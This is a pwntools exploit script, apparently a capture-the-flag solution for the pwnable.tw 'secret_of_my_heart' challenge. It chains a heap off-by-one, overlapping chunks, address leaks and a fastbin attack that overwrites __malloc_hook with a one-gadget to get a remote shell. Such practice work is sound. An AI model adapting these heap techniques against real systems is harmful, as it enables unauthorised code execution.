#!/usr/bin/env python
from pwn import *
#context.log_level = "DEBUG"

addr = "chall.pwnable.tw"
port = 10302
binary = "./secret_of_my_heart"
libc_so = './libc_64.so.6'
env = {'LD_PRELOAD':libc_so}
#env = {}

libc = ELF("./libc_64.so.6")
#recv_offset = libc.symbols['recv']
system_offset = libc.symbols['system']
malloc_hook_offset = libc.symbols['__malloc_hook']

s = remote(addr, port)
#s = process([binary,"tcp", "tcp", "tcp3"], env=env)

def Menu(_index):
    #sleep(0.1)
    s.recvuntil("1. Add a secret")
    s.recvuntil("2. show a secret")
    s.recvuntil("3. delete a secret")
    s.recvuntil("4. Exit")
    s.recvuntil("Your choice :")
    s.send(str(_index))

def Add(_size, _name, _secret):
    Menu(1)
    print s.recvuntil("Size of heart : ")
    s.send(str(_size))
    print s.recvuntil("Name of heart :")
    s.send(_name)
    print s.recvuntil("secret of my heart :")
    s.send(_secret)

def Show(_index):
    Menu(2)
    print s.recvuntil("Index :")
    s.send(str(_index))
    sleep(0.3)
    print s.recvuntil("Name : %s" % ("A"*32))
    chunk_leak = u64(s.recv(6)+"\x00\x00")
    print s.recvuntil("Secret : ")
    libc_leak = u64(s.recv(6)+"\x00\x00")
    log.info("chunk_leak : %x" % chunk_leak)
    log.info("libc_leak : %x" % libc_leak)
    return (chunk_leak, libc_leak)

def Delete(_index):
    Menu(3)
    print s.recvuntil("Index :")
    s.send(str(_index))

'''
for i in range(0, 80):
    Add(256, "A"*32, "B"*10)
'''

#Add(0x18, "A"*32, "0"*0x18)
Add(0x68, "A"*32, "\x00"*0x68)
Add(0x100, "A"*32, "1")
Add(0x100, "A"*32, "2"*0xe0+p64(0x200))
Add(0x100, "A"*32, "3")
Add(0x100, "barrier", "4")
Delete(1)
Delete(2)
#Add(256, "A"*32, "\x00"*256)

Delete(0)
Add(0x68, "A"*32, "\x00"*0x68) # off by one

Add(0x100, "A"*32, "1")
Add(0x80, "A"*32, "2")

Delete(1)
Delete(3)

Add(0x100, "A"*32, "1")
Add(0x100, "A"*32, "3"*0x80+p64(0x220)+p64(0x60)) #overlarp 2 == 3

Delete(3) # 0, 1, 2, 4

leaks = Show(2)
chunkd_leak = leaks[0]
libc_leak = leaks[1]
malloc_hook = libc_leak - 0x68
libc_base = malloc_hook - malloc_hook_offset
system_libc = libc_base + system_offset
one_shot = libc_base + 0xef6c4

log.info("libc_base : 0x%x" % libc_base)
log.info("malloc_hook : 0x%x" % malloc_hook)
log.info("system_libc : 0x%x" % system_libc)
log.info("one_shot : 0x%x" % one_shot)

#fast bin attack
Add(0x68, "A"*32, "3")
Delete(3) #A
Delete(0) #B
Delete(2) #A
Add(0x68, "A"*32, p64(malloc_hook-0x1b-0x8)) # return 0x7f size chunk
Add(0x68, "A"*32, "3")
Add(0x68, "A"*32, "5")

Add(0x68, "A"*32, "A"*0x13+p64(one_shot)) #overwrite malloc_hook

#gdb.attach(s, ("b *%s" % one_shot) + "\nc\n")

#trigger malloc_printerr
Delete(3)
Delete(5)

#Show(1)

s.interactive()
s.close()
